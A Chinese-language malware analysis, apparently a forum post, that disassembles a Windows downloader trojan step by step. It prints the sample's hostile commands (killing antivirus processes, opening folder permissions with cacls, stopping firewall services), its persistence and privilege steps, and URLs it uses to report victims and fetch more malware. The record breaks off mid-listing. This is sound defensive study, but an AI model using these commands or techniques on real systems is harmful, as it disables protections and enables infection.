
# 一个下载者分析

> 原文：[`www.pediy.com/kssd/pediy12/141475.html`](https://www.pediy.com/kssd/pediy12/141475.html)

下载者分析，努力发帖中

关键字：`svchost.exe`, `ekrn.exe`, `egui.exe`，`pcidump.sys`，`killdll.dll`，`15958957.dll`，`28720812_xeex.exe`

病毒分析：

UPX 壳，ESP 定律简单脱之，脱壳后有花指令干扰分析。

## （1）创建一个互斥体

```
0040281D    .  68 B4124000     push 004012B4                   ;  ASCII "AAeesstt..."
00402822    .  6A 00          push 0
00402824    .  6A 00          push 0
00402826    .  FF95 88F4FFFF  call dword ptr [ebp-B78]          ;  kernel32.CreateMutexA
0040282C    .  8985 A0F6FFFF  mov dword ptr [ebp-960], eax
00402832    .  FF15 28104000  call dword ptr [401028]          ;  ntdll.RtlGetLastWin32Error
00402838    .  3D B7000000    cmp eax, 0B7
0040283D    .  75 08         jnz short 00402847
0040283F    .  6A 00         push 0                             ; /ExitCode = 0
00402841    .  FF15 54104000  call dword ptr [401054]          ; \ExitProcess
```

补充此类病毒中有的会调用 `FindWindowA` 函数，检查是否有窗体上弹出(ASCII `"TTe.er.eabcds.ss"`)这个字符串，如果有就是发现自己被报毒了，然后退出。

## （2）和 `C:\WINDOWS\Explorer.EXE` 比较

```
00402B16    .  50             push eax                          ; /String2
00402B17    .  8D85 C0F9FFFF  lea eax, dword ptr [ebp-640]      ; |
00402B1D    .  50             push eax                          ; |String1
00402B1E    .  FF15 20104000  call dword ptr [401020]          ; \lstrcmpiA
0012F3FC   0012F980   |String1 = "C:\WINDOWS\system32\scvhost.exe"
0012F400   0012FCAC   \String2 = "C:\WINDOWS\Explorer.EXE"
```

如果自身是 `explorer.exe`，复制 `%SystemRoot%\system32\drivers\gm.dls` 为 `%SystemRoot%\temp\explorer.exe`，然后运行 `%SystemRoot%\temp\explorer.exe`。

复制 `%SystemRoot%\system32\drivers\gm.dls` 为 `%SystemRoot%\temp\explorer.exe`

```
00402BD2    .  8D85 90F5FFFF  lea eax, dword ptr [ebp-A70]
00402BD8    .  50             push eax
00402BD9    .  FF95 80F4FFFF  call dword ptr [ebp-B80]          ;  kernel32.CopyFileA
0012F3F8   0012F550   ASCII "C:\WINDOWS\system32\drivers\gm.dls"
0012F3FC   0012FBAC   ASCII "C:\WINDOWS\temp\Explorer.exe"
```

运行 `%SystemRoot%\temp\explorer.exe`。

```
00402BF9    .  50             push eax
00402BFA    .  FF95 7CF4FFFF  call dword ptr [ebp-B84]          ;  kernel32.WinExec
0012F3FC   0012FBAC   ASCII "C:\WINDOWS\temp\Explorer.exe"
```

## （3）不是 `explorer.exe`，从这里执行

设置 `%SystemRoot%` 和 `%Temp%` 目录权限为 `everyone` 完全控制，停止 `ekrn` 服务，结束 `ekrn.exe`，`egui.exe` 和 `ScanFrm.exe` 进程。

```
0012F288   0012F3CC   ASCII "cmd.exe /c taskkill.exe /im ekrn.exe /f"
0012F294   0012F2A4   ASCII "cmd.exe /c taskkill.exe /im ekrn.exe /f"

0040238D   |.  51             push ecx      cmd.exe /c taskkill.exe /im ekrn.exe /f
0040238E   |.  FFD0          call eax          ;  kernel32.WinExec

0012F294   0012F2A4   ASCII "cmd.exe /c taskkill.exe /im egui.exe /f"
004023B4   |.  51             push ecx
004023B5   |.  FFD0          call eax          ;  kernel32.WinExec

0012F3EC   0012FDAC   ASCII "C:\WINDOWS\aa14250861.exe"
00402D42    .  50             push eax
00402D43    .  FF95 68F4FFFF  call dword ptr [ebp-B98]          ;  kernel32.WinExec
```

## （4）释放动态库文件

释放动态库文件 `0012F430   7FFDFC00   UNICODE "C:\WINDOWS\system32\15958957.dll"`，结束大量安全软件进程，劫持安全软件。

`Dll` 名字不一样，有的为释放 `killdll.dll` 到 `WINDOWS` 目录，猜测原始版本应该是 `killdll.dll`，

然后执行命令行：`C:\WINDOWS\system32\rundll32.exe C:\WINDOWS\15958957.dll testall` 加载自己。

## （5）调用 `GetTickCount` 函数

调用 `GetTickCount` 函数，根据开机时间生成一个 `EXE` 文件到 `WINDOWS` 目录（我的机器为:

`C:\WINDOWS\aa16113109.exe`），接着调用 `WinExec` 函数执行 `aa16113109.exe`，名字不一样，有的是同一个系列如 `28720812_xeex.exe`。

```
00402CD6    .  FFB5 6CF4FFFF  push dword ptr [ebp-B94]
00402CDC    .  68 74104000    push 00401074                   ;  ASCII "aa16113109.exe"
00402CE1    .  68 A8124000    push 004012A8                   ;  ASCII "a%s%d.exe"
00402CE6    .  68 74104000    push 00401074                   ;  ASCII "aa16113109.exe"
00402CEB    .  FF95 70F4FFFF  call dword ptr [ebp-B90]
00402CF1    .  68 98124000    push 00401298                   ; /StringToAdd = "\\"
00402CF6    .  8D85 ECFDFFFF  lea eax, dword ptr [ebp-214]     ; |
00402CFC    .  50             push eax                          ; |ConcatString
00402CFD    .  FF15 50104000  call dword ptr [401050]          ; \lstrcatA
```

执行

```
00402D42    .  50             push eax
00402D43    .  FF95 68F4FFFF  call dword ptr [ebp-B98]          ;  kernel32.WinExec
0012F3EC   0012FDAC   ASCII "C:\WINDOWS\aa16113109.exe"
0012F3F0   00000000
```

## （6）释放驱动文件 `pcidump.sys`

释放驱动文件 `pcidump.sys`，创建服务启动驱动，修改 `gm.dls` 和 `explorer.exe`，删除驱动文件。

```
00401ACE    .  6A 00          push 0                             ; /Password = NULL
00401AD0    .  6A 00          push 0                             ; |ServiceStartName = NULL
00401AD2    .  6A 00          push 0                             ; |pDependencies = NULL
00401AD4    .  6A 00          push 0                             ; |pTagId = NULL
00401AD6    .  6A 00          push 0                             ; |LoadOrderGroup = NULL
00401AD8    .  FF75 08        push dword ptr [ebp+8]             ; |BinaryPathName
00401ADB    .  6A 00          push 0                             ; |ErrorControl = SERVICE_ERROR_IGNORE
00401ADD    .  6A 03          push 3                             ; |StartType = SERVICE_DEMAND_START
00401ADF    .  6A 01          push 1                             ; |ServiceType = SERVICE_KERNEL_DRIVER
00401AE1    .  68 FF010F00    push 0F01FF                        ; |DesiredAccess = SERVICE_ALL_ACCESS
00401AE6    .  68 24124000    push 00401224                      ; |pcidump\\.\\pcidump\??\
00401AEB    .  68 24124000    push 00401224                      ; |pcidump\\.\\pcidump\??\
00401AF0    .  FF75 FC        push dword ptr [ebp-4]             ; |hManager
00401AF3    .  FF15 00104000  call dword ptr [401000]            ; \CreateServiceA
```

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PCIDump`

`ImagePath;\??\C:\WINDOWS\system32\drivers\pcidump.sys`

`DisplayName;pcidump`

修改 `gm.dls` 和 `explorer.exe`

```
004020A7    .  68 2C124000    push 0040122C                   ;  ASCII "\\.\\pcidump"
004020AC    .  FF95 B4FDFFFF  call dword ptr [ebp-24C]     ;CreatFileA
```

删除驱动文件

```
00401DE6    .  FF75 08        push dword ptr [ebp+8]
00401DE9    .  FF55 D4        call dword ptr [ebp-2C]     ;DeleteFileA
0012F3A8   00401DEC   scvhost.00401DEC
0012F3AC   0012F664   ASCII "C:\WINDOWS\system32\drivers\pcidump.sys"
```

## （7）把自身复制到 `system32` 系统目录下

把自身复制到 `system32` 系统目录下，并命名为：`scvhost.exe`

若是自身就结束进程，不是就自身复制到 `system32` 系统目录下，并命名为：`scvhost.exe`

```
0040318B    .  50             push eax                          ; /String2
0040318C    .  8D85 C0F9FFFF  lea eax, dword ptr [ebp-640]      ; |
00403192    .  50             push eax                          ; |String1
00403193    .  FF15 20104000  call dword ptr [401020]          ; \lstrcmpiA
0012F3EC   0012F980   |String1 = "C:\WINDOWS\system32\scvhost.exe"
0012F3F0   0012FEB0   \String2 = "C:\WINDOWS\system32\scvhost.exe"
```

## （8）复制完后创建一个 `exita.bat` 到 `windows` 目录

复制完后创建一个 `exita.bat` 到 `windows` 目录，删除自身。

```
00401871    .  BE 18124000    mov esi, 00401218               ;  exita.bat
00401876    .  8DBD E8F6FFFF  lea edi, dword ptr [ebp-918]
0040187C    .  A5             movs dword ptr es:[edi], dword ptr [esi>
0040187D    .  A5             movs dword ptr es:[edi], dword ptr [esi>
0012EAE4        40 65 63 68 6F 20 6F 66 66 0A 0D 40 65 63 68 6F   @echo off..@echo
0012EAF4        20 61 62 63 64 65 66 61 3E 3E 31 31 2E 71 65 61  abcdefa>>11.qea
```



### 主程序字节流分析

```
0012EB04        0A 0D 40 65 63 68 6F 20 61 62 63 64 65 66 61 3E  ..@echo abcdefa>  

0012EB14        3E 31 31 2E 71 65 61 0A 0D 40 65 63 68 6F 20 61  >11.qea..@echo a  

0012EB24        62 63 64 65 66 61 3E 3E 31 31 2E 71 65 61 0A 0D  bcdefa>>11.qea..  

0012EB34        40 65 63 68 6F 20 61 62 63 64 65 66 61 3E 3E 31  @echo abcdefa>>1  

0012EB44        31 2E 71 65 61 0A 0D 40 65 63 68 6F 20 61 62 63  1.qea..@echo abc  

0012EB54        64 65 66 61 3E 3E 31 31 2E 71 65 61 0A 0D 40 65  defa>>11.qea..@e  

0012EB64        63 68 6F 20 61 62 63 64 65 66 61 3E 3E 31 31 2E  cho abcdefa>>11.  

0012EB74        71 65 61 0A 0D 40 65 63 68 6F 20 61 62 63 64 65  qea..@echo abcde  

0012EB84        66 61 3E 3E 31 31 2E 71 65 61 0A 0D 40 65 63 68  fa>>11.qea..@ech  

0012EB94        6F 20 61 62 63 64 65 66 61 3E 3E 31 31 2E 71 65  o abcdefa>>11.qe  

0012EBA4        61 0A 0D 40 65 63 68 6F 20 61 62 63 64 65 66 61  a..@echo abcdefa  

0012EBB4        3E 3E 31 31 2E 71 65 61 0A 0D 40 65 63 68 6F 20  >>11.qea..@echo  

0012EBC4        61 62 63 64 65 66 61 3E 3E 31 31 2E 71 65 61 0A  abcdefa>>11.qea.  

0012EBD4        0D 40 64 65 6C 20 31 31 2E 71 65 61 0A 0D 40 64  .@del 11.qea..@d  

0012EBE4        65 6C 20 22 43 3A 5C 44 6F 63 75 6D 65 6E 74 73  el "C:\\Documents  

0012EBF4        20 61 6E 64 20 53 65 74 74 69 6E 67 73 5C 73 61   and Settings\\sa  

0012EC04        66 65 5C D7 C0 C3 E6 5C 32 33 5C 37 32 36 30 5F  fe\\桌面\\23\\7260\_  

0012EC14        73 63 76 68 6F 73 74 2E 65 78 65 22 0A 0D 40 64  scvhost.exe"..@d  

0012EC24        65 6C 20 65 78 69 74 61 2E 62 61 74 0A 0D 40 65  el exita.bat..@e  

0012EC34        78 69 74                                              xit  
```

到此主程序分析完。

### `aa16113109.exe` 分析

接着分析下 `aa16113109.exe`，（别的版本可能是 `28720812_xeex.exe`）

#### 1. 创建互斥体

创建互斥体 `"XETTETT......"`，如果存在则退出，避免病毒重复运行。

```
00400FE9 a>/$   55                 push ebp                             ;  (Initial CPU selection)  

00400FEA   |.   8BEC               mov ebp, esp  

00400FEC   |.   81EC 10020000      sub esp, 210  

00400FF2   |.   56                 push esi  

00400FF3   |.   33F6               xor esi, esi  

00400FF5   |.   68 84084000        push 00400884                          ; /XETTETT......  

00400FFA   |.   56                 push esi                                 ; |InitialOwner => FALSE  

00400FFB   |.   56                 push esi                                 ; |pSecurity => NULL  

00400FFC   |.   FF15 54044000      call dword ptr [<&KERNEL32.CreateMutexA]; \CreateMutexA  

00401002   |.   FF15 40044000      call dword ptr [<&KERNEL32.GetLastError>; [GetLastError  

00401008   |.   3D B7000000        cmp eax, 0B7  

0040100D   |.   75 07              jnz short 00401016  
```

#### 2. 更改文件夹权限

更改以下文件夹权限 (NTFS)，为隐藏和下载病毒作准备。

```
0040104C   |.   56                 push esi                                 ; /ShowState  

0040104D   |.   8B35 50044000      mov esi, dword ptr [<&KERNEL32.WinExec>>; |kernel32.WinExec  

00401053   |.   50                 push eax                                 ; |CmdLine  

00401054   |.   FFD6               call esi                                 ; \WinExec  
```

```
cmd /c cacls C:\\WINDOWS\\system32 /e /p everyone:f

cmd /c cacls ""C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\"" /e /p everyone:f
```

#### 3. 结束服务

结束 `wscsvc` 和 `SharedAccess` 服务

```
004010A2   |.   68 24084000        push 00400824                          ;  cmd /c net stop wscsvc  

004010A7   |.   FFD6               call esi                                 ;  kernel32.WinExec  

004010AE   |.   68 04084000        push 00400804                          ;  cmd /c net stop SharedAccess  

004010B3   |.   FFD6               call esi                                 ;  kernel32.WinExec  

004010BA   |.   68 D4074000        push 004007D4                          ;  cmd /c sc config sharedaccess start= disabled  

004010BF   |.   FFD6               call esi                                 ;  kernel32.WinExec  
```

#### 4. 提权

给自己提权

```
00400C5B   /$   55                 push ebp  

00400C5C   |.   8BEC               mov ebp, esp  

00400C5E   |.   83EC 14            sub esp, 14  

00400C61   |.   FF15 7C044000      call dword ptr [<&KERNEL32.GetCurrentPr>; [GetCurrentProcess  

00400C67   |.   8D4D FC            lea ecx, [local.1]  

00400C6A   |.   51                 push ecx                                 ; /phToken  

00400C6B   |.   6A 28              push 28                                  ; |DesiredAccess = TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES  

00400C6D   |.   50                 push eax                                 ; |hProcess  

00400C6E   |.   FF15 04044000      call dword ptr [<&ADVAPI32.OpenProcessT>; \OpenProcessToken  

00400C74   |.   85C0               test eax, eax  

00400C76   |.   74 33              je short 00400CAB  

00400C78   |.   8D45 F0            lea eax, [local.4]  

00400C7B   |.   56                 push esi  

00400C7C   |.   50                 push eax                                 ; /pLocalId  

00400C7D   |.   33F6               xor esi, esi                               ; |  

00400C7F   |.   68 00074000        push 00400700                          ; |SeDebugPrivilege  

00400C84   |.   56                 push esi                                 ; |SystemName => NULL  

00400C85   |.   FF15 00044000      call dword ptr [<&ADVAPI32.LookupPrivil>; \LookupPrivilegeValueA  

00400C8B   |.   56                 push esi                                 ; /pRetLen => NULL  

00400C8C   |.   56                 push esi                                 ; |pPrevState => NULL  

00400C8D   |.   8D45 EC            lea eax, [local.5]                        ; |  

00400C90   |.   56                 push esi                                 ; |PrevStateSize => 0  

00400C91   |.   50                 push eax                                 ; |pNewState  

00400C92   |.   56                 push esi                                 ; |DisableAllPrivileges => FALSE  

00400C93   |.   FF75 FC            push [local.1]                            ; |hToken  

00400C96   |.   C745 EC 0100000> mov [local.5], 1                            ; |  

00400C9D   |.   C745 F8 0200000> mov [local.2], 2                            ; |  

00400CA4   |.   FF15 14044000      call dword ptr [<&ADVAPI32.AdjustTokenP>; \AdjustTokenPrivileges  

00400CAA   |.   5E                 pop esi  

00400CAB   |>   C9                 leave  

00400CAC   \\.  C3                 retn  
```

#### 5. 文件操作

```
00400D64   |.   6A 00              push 0                                   ; /FailIfExists = FALSE  

00400D66   |.   50                 push eax                                 ; |NewFileName  

00400D67   |.   8D85 F8FDFFFF      lea eax, [local.130]                      ; |  

00400D6D   |.   50                 push eax                                 ; |ExistingFileName  

00400D6E   |.   FF15 70044000      call dword ptr [<&KERNEL32.CopyFileA>]    ; \CopyFileA  

00400D74   |.   8D85 FCFEFFFF      lea eax, [local.65]  

00400D7A   |.   50                 push eax                                 ; /FileName  =C:\\DOCUME~1\\safe\\LOCALS~1\\Temp\\opeF.tmp  

00400D7B   |.   FF15 74044000      call dword ptr [<&KERNEL32.LoadLibraryA>; \LoadLibraryA  

0012FB80   0012FB94   |ExistingFileName = "C:\\WINDOWS\\system32\\wininet.dll"  

0012FB84   0012FC98   |NewFileName = "C:\\DOCUME~1\\safe\\LOCALS~1\\Temp\\opeF.tmp"  

0012FB88   00000000   \FailIfExists = FALSE  
```

#### 6. 解密字符串与注册表

解密字符串，原始字符，解密函数和解密后字符。

`QMDVUCPG^^Okapmqmdv^^Uklfmuq^^AwppglvTgpqkml^^Pwl`

```
00400BF9   |> /3106               /xor dword ptr [esi], eax  

00400BFB   |. |46                  |inc esi  

00400BFC   |.^\\E2 FB            \\loopd short 00400BF9  

0012FB28   0012FD58   ASCII "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"  
```

修改注册表键值，让病毒开机运行。

注册表键：`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

注册表名称：`360Soft`；类型: `REG_SZ`；数值数据：`C:\WINDOWS\system32\scvhost.exe`

#### 7. 创建线程

创建 3 个线程：

线程一：遍历窗口，如果发现 `"Windows 文件保护"` 窗口，隐藏 WINDOWS 文件保护窗口。

```
00400FA2    > /68 C0074000       push 004007C0                          ; /Windows 文件保护  

00400FA7    . |68 B8074000       push 004007B8                          ; |#32770  

00400FAC    . |FF15 4C054000    call dword ptr [<&USER32.FindWindowA>]  ; \FindWindowA  
```



### 线程一：获取窗口句柄并执行隐藏与休眠

```
00400FB2    . |8BF0           mov esi, eax  
00400FB4    . |85F6           test esi, esi  
00400FB6    . |74 27          je short 00400FDF  
00400FB8    . |6A F0          push -10                    ; /Index = GWL_STYLE  
00400FBA    . |56             push esi                    ; |hWnd  
00400FBB    . |FF15 48054000  call dword ptr [<&USER32.GetWindowLongA>]; \GetWindowLongA  
00400FC1    . |0D 00000010    or eax, 10000000  
00400FC6    . |75 17          jnz short 00400FDF  
00400FC8    . |6A 00          push 0  
00400FCA    . |68 A4074000    push 004007A4               ;  找到恢复文件对话框  
00400FCF    . |E8 BDFBFFFF    call 00400B91  
00400FD4    . |59             pop ecx  
00400FD5    . |59             pop ecx  
00400FD6    . |6A 00          push 0                      ; /ShowState = SW_HIDE  
00400FD8    . |56             push esi                    ; |hWnd  
00400FD9    . |FF15 44054000  call dword ptr [<&USER32.ShowWindow>]   ; \ShowWindow  
00400FDF    > |6A 32          push 32                     ; /Timeout = 50. ms  
00400FE1    . |FF15 80044000  call dword ptr [<&KERNEL32.Sleep>]      ; \Sleep  
00400FE7    . ^\EB B9        jmp short 00400FA2  
```

### 线程二：获取操作系统版本

```
00401127     /$  55           push ebp  
00401128     |.  8BEC         mov ebp, esp  
0040112A     |.  81EC 9C000000  sub esp, 9C  
00401130     |.  68 9C000000    push 9C                     ; /n = 9C (156.)  
00401135     |.  8D85 64FFFFFF  lea eax, [local.39]           ; |  
0040113B     |.  6A 00          push 0                      ; |c = 00  
0040113D     |.  50             push eax                    ; |s  
0040113E     |.  E8 59110000    call <jmp.&MSVCRT.memset>    ; \memset  
00401143     |.  83C4 0C        add esp, 0C  
00401146     |.  8D85 64FFFFFF  lea eax, [local.39]  
0040114C     |.  C785 64FFFFFF 9>mov [local.39], 9C  
00401156     |.  50             push eax                    ; /pVersionInformation  
00401157     |.  FF15 58044000  call dword ptr [<&KERNEL32.GetVersionEx>]; \GetVersionExA----获取版本  
0040115D     |.  B8 8C244000    mov eax, 0040248C         
00401162     |.  C9             leave  
00401163     \\.  C3            retn  
```

### 线程三：连接并获得被感染用户的信息

```
0040122A     |.  50             push eax                    ; /src  
0040122B     |.  8D85 F0FEFFFF  lea eax, [local.68]          ; |  
00401231     |.  50             push eax                    ; |dest  
00401232     |.  E8 A9100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
00401237     |.  8D85 F0FCFFFF  lea eax, [local.196]  
0040123D     |.  50             push eax                    ; /src  
0040123E     |.  8D85 F0FEFFFF  lea eax, [local.68]          ; |  
00401244     |.  50             push eax                    ; |dest  
00401245     |.  E8 96100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
0040124A     |.  8D85 F0FEFFFF  lea eax, [local.68]  
00401250     |.  68 A4084000    push 004008A4               ; /&ver=  
00401255     |.  50             push eax                    ; |dest  
00401256     |.  E8 85100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
0040125B     |.  8D85 F0FEFFFF  lea eax, [local.68]  
00401261     |.  68 80064000    push 00400680               ; /2009-9-21  
00401266     |.  50             push eax                    ; |dest  
00401267     |.  E8 74100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
0040126C     |.  8D85 F0FEFFFF  lea eax, [local.68]  
00401272     |.  68 9C084000    push 0040089C               ; /&os=  
00401277     |.  50             push eax                    ; |dest  
00401278     |.  E8 63100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
0040127D     |.  E8 A5FEFFFF    call 00401127               ;  获取操作系统版本  
00401282     |.  50             push eax                    ; /src  
00401283     |.  8D85 F0FEFFFF  lea eax, [local.68]          ; |  
00401289     |.  50             push eax                    ; |dest  
0040128A     |.  E8 51100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
0040128F     |.  8D85 F0FEFFFF  lea eax, [local.68]  
00401295     |.  68 94084000    push 00400894               ; /&dtime=&os=  
0040129A     |.  50             push eax                    ; |dest  
0040129B     |.  E8 40100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
004012A0     |.  83C4 40        add esp, 40  
004012A3     |.  8D85 F0FEFFFF  lea eax, [local.68]  
004012A9     |.  68 94064000    push 00400694               ; /2009-9-2  
004012AE     |.  50             push eax                    ; |dest  
004012AF     |.  E8 2C100000    call <jmp.&MSVCRT.strcat>   ; \strcat  
```

#### 在内存中的用户信息

```
00E5FEA4        68 74 74 70 3A 2F 2F 61 73 70 2E 63 6E 7A 7A 74  http://asp.cnzzt  
00E5FEB4        6A 2E 6E 65 74 2F 76 34 34 2F 63 6F 75 6E 74 2E  j.net/v44/count.  
00E5FEC4        61 73 70 3F 6D 61 63 3D 38 30 30 30 32 37 61 38  asp?mac=800027a8  
00E5FED4        62 63 62 34 26 76 65 72 3D 32 30 30 39 2D 39 2D  bcb4&ver=2009-9-  
00E5FEE4        32 31 26 6F 73 3D 26 64 74 69 6D 65 3D 32 30 30  21&os=&dtime=200  
00E5FEF4        39 2D 39 2D 32 00                                  9-9-2.  
```

#### 用 `opeF.InternetOpenUrlA` 发送出去

```
004012B4     |.  59             pop ecx  
004012B5     |.  8D85 F0FEFFFF  lea eax, [local.68]  
004012BB     |.  59             pop ecx  
004012BC     |.  53             push ebx  
004012BD     |.  68 00000080    push 80000000  
004012C2     |.  53             push ebx  
004012C3     |.  53             push ebx  
004012C4     |.  50             push eax        ==00E5FEA4  
004012C5     |.  FF75 FC        push [local.1]  
004012C8     |.  FF15 78244000  call dword ptr [402478]           ;  opeF.InternetOpenUrlA  
```

### 3. 访问统计接口与解密病毒下载列表

访问 `00E5FC94` `00E5FDA4` `ASCII "http://asp.cnzztj.net/v44/count.asp"`（估计是统计感染用户数）。

解密字符串（病毒下载列表），解密结果为：`http://ohyes88.com/xin/xx.txt`

```
00400FCF  |.  8D85 4CFEFFFF  lea     eax, dword ptr [ebp-1B4]  
00400FD5  |.  68 08244000    push    00402408                   ; /src = "H7CX26h`Ez[aZPeOA3u:ZQKcRTrOGxI
[onQaUOlNr@SmWppVk@6[WCCC"  
00400FDA  |.  50             push    eax                        ; |dest  
00400FDB  |.  E8 B2060000    call    <jmp.&MSVCRT.strcpy>      ; \strcpy  
00400FE0  |.  83C4 44        add     esp, 44  
00400FE3  |.  8D85 4CFBFFFF  lea     eax, dword ptr [ebp-4B4]  
00400FE9  |.  50             push    eax  
00400FEA  |.  8D85 4CFEFFFF  lea     eax, dword ptr [ebp-1B4]  
00400FF0  |.  50             push    eax                        ; /s  
00400FF1  |.  E8 96060000    call    <jmp.&MSVCRT.strlen>      ; \strlen  
00400FF6  |.  59             pop     ecx  
00400FF7  |.  50             push    eax  
00400FF8  |.  8D85 4CFEFFFF  lea     eax, dword ptr [ebp-1B4]  
00400FFE  |.  50             push    eax  
00400FFF  |.  E8 4DF7FFFF    call    00400751  
00401004  |.  8D85 4CFDFFFF  lea     eax, dword ptr [ebp-2B4]  
0040100A  |.  50             push    eax  
0040100B  |.  8D85 4CFBFFFF  lea     eax, dword ptr [ebp-4B4]  
00401011  |.  50             push    eax  
00401012  |.  E8 E7F5FFFF    call    004005FE  
00401017  |.  8D85 4CFCFFFF  lea     eax, dword ptr [ebp-3B4]  
0040101D  |.  50             push    eax  
0040101E  |.  8D85 4CFDFFFF  lea     eax, dword ptr [ebp-2B4]  
00401024  |.  50             push    eax  
00401025  |.  E8 81F6FFFF    call    004006AB  
```



```
0040102A  |.  8D85 4CFCFFFF lea     eax, dword ptr [ebp-3B4]  

00401030  |.  50            push    eax                           ; 病毒列表:/src = "http://****com/xin/xx.txt"  

00401031  |.  8D85 BCF9FFFF lea     eax, dword ptr [ebp-644]             ; |  

00401037  |.  50            push    eax                           ; |dest  

00401038  |.  E8 55060000   call    <jmp.&MSVCRT.strcpy>          ; \strcpy  

0040103D  |.  83C4 24       add     esp, 24  
```

5. 访问病毒文件列表，下载以下病毒:

`http://2009******.com/**8o/aa**1*.exe`

`http://2009******.com/*88o/aa**2*.exe`

`http://2009******.com/**8ao/aa*3****.exe`

...

到临时文件夹 `C:\Documents and Settings\Administrator\Local Settings\Temporary Internet Files\Content.IE5\U7YRQDIL` 中

线程二： 下载 `http://58.221.254.104/360.jpg` 文件到临时文件夹，设置为只读属性。并在本地 `hosts` 文件里添加 `host.jpg` 文件里面的内容。

```
00401361   |.  68 CC054000     push 004005CC                     ; /http://58.221.254.104/360.jpg  

00401366   |.  50              push eax                          ; |dest  

00401367   |.  E8 360F0000     call <jmp.&MSVCRT.strcpy>        ; \strcpy  

0040136C   |.  83C4 20         add  esp, 20  

0040136F   |.  8D85 ECFDFFFF    lea  eax, [local.133]  

00401375   |.  68 CC084000     push 004008CC                     ; /http://host360Soft\  

0040137A   |.  50              push eax                          ; |String1  

0040137B   |.  FF15 5C044000   call dword ptr [<&KERNEL32.lstrcmpiA>]  ; \lstrcmpiA  

00401381   |.  85C0            test eax, eax  

00401383   |.  74 43           je   short 004013C8  

00401385   |.  8D85 ECFEFFFF    lea  eax, [local.69]  

0040138B   |.  56              push esi                          ; /BufSize  

0040138C   |.  50              push eax                          ; |Buffer  

0040138D   |.  FF15 1C044000   call dword ptr [<&KERNEL32.GetSystemDir>; \GetSystemDirectoryA  

00401393   |.  8D45 EC         lea  eax, [local.5]  

00401396   |.  50              push eax                          ; /src  

00401397   |.  8D85 ECFEFFFF    lea  eax, [local.69]                ; |  

0040139D   |.  50              push eax                          ; |dest  

0040139E   |.  E8 3D0F0000     call <jmp.&MSVCRT.strcat>       ; \strcat  

004013A3   |.  8D85 ECFEFFFF    lea  eax, [local.69]  

004013A9   |.  50              push eax  

004013AA   |.  8D85 ECFDFFFF    lea  eax, [local.133]  

004013B0   |.  50              push eax  

004013B1   |.  E8 21FAFFFF     call 00400DD7      -----------写入 Host 文件的函数  

004013B6   |.  83C4 10         add  esp, 10  

004013B9   |.  8D85 ECFEFFFF    lea  eax, [local.69]  

004013BF   |.  6A 01           push 1                            ; /FileAttributes = READONLY  

004013C1   |.  50              push eax                          ; |FileName  

004013C2   |.  FF15 60044000   call dword ptr [<&KERNEL32.SetFileAttri>; \SetFileAttributesA
```

`--写入 Host 文件的函数：--------------------------------------------------------------------`

```
00400DD7   /$  55              push ebp  

00400DD8   |.  8BEC            mov  ebp, esp  

00400DDA   |.  B8 08100000     mov  eax, 1008  

00400DDF   |.  E8 CC140000     call 004022B0  

00400DE4   |.  56              push esi  

00400DE5   |.  33F6            xor  esi, esi  

00400DE7   |.  56              push esi  

00400DE8   |.  56              push esi  

00400DE9   |.  56              push esi  

00400DEA   |.  56              push esi  

00400DEB   |.  68 78074000     push 00400778                       ;  MyIE/1.0  

00400DF0   |.  FF15 7C244000   call dword ptr [40247C]             ;  opeF.InternetOpenA  

00400DF6   |.  3BC6            cmp  eax, esi  

00400DF8   |.  8945 F8         mov  [local.2], eax  

00400DFB   |.  0F84 B7000000   je   00400EB8  

00400E01   |.  FF75 08         push [arg.1]  

00400E04   |.  FF15 58054000   call dword ptr [<&WININET.DeleteUrlCach>;  wininet.DeleteUrlCacheEntryA  

00400E0A   |.  56              push esi  

00400E0B   |.  68 00000084     push 84000000  

00400E10   |.  56              push esi  

00400E11   |.  56              push esi  

00400E12   |.  FF75 08         push [arg.1]  

00400E15   |.  FF75 F8         push [local.2]  

00400E18   |.  FF15 78244000   call dword ptr [402478]             ;  opeF.InternetOpenUrlA  

00400E1E   |.  3BC6            cmp  eax, esi  

00400E20   |.  8945 08         mov  [arg.1], eax  

00400E23   |.  0F84 86000000   je   00400EAF  

00400E29   |.  53              push ebx  

00400E2A   |.  FF75 0C         push [arg.2]                        ; /FileName  

00400E2D   |.  FF15 38044000   call dword ptr [<&KERNEL32.DeleteFileA>>; \DeleteFileA  

00400E33   |.  56              push esi                          ; /hTemplateFile  

00400E34   |.  68 80000000     push 80                             ; |Attributes = NORMAL  

00400E39   |.  6A 01           push 1                              ; |Mode = CREATE_NEW  

00400E3B   |.  56              push esi                          ; |pSecurity  

00400E3C   |.  6A 01           push 1                              ; |ShareMode = FILE_SHARE_READ  

00400E3E   |.  68 00000040     push 40000000                       ; |Access = GENERIC_WRITE  

00400E43   |.  FF75 0C         push [arg.2]                        ; |FileName  

00400E46   |.  FF15 34044000   call dword ptr [<&KERNEL32.CreateFileA>>; \CreateFileA  

00400E4C   |.  8BD8            mov  ebx, eax  

00400E4E   |.  83FB FF         cmp  ebx, -1  

00400E51   |.  74 52           je   short 00400EA5  

00400E53   |.  57              push edi  

00400E54   |>  8D45 FC         /lea  eax, [local.1]  

00400E57   |.  50              |push  eax  

00400E58   |.  8D85 F8EFFFFF   |lea  eax, [local.1026]  

00400E5E   |.  68 00100000     |push  1000  

00400E63   |.  50              |push  eax  

00400E64   |.  FF75 08         |push  [arg.1]  

00400E67   |.  FF15 74244000   |call  dword ptr [402474]           ;  opeF.InternetReadFile  

00400E6D   |.  8BF8            |mov  edi, eax  

00400E6F   |.  8D45 FC         |lea  eax, [local.1]  

00400E72   |.  56              |push  esi                            ; /pOverlapped  

00400E73   |.  50              |push  eax                            ; |pBytesWritten  

00400E74   |.  FF75 FC         |push  [local.1]                       ; |nBytesToWrite  

00400E77   |.  8D85 F8EFFFFF   |lea  eax, [local.1026]               ; |  

00400E7D   |.  50              |push  eax                            ; |Buffer  

00400E7E   |.  53              |push  ebx                            ; |hFile  

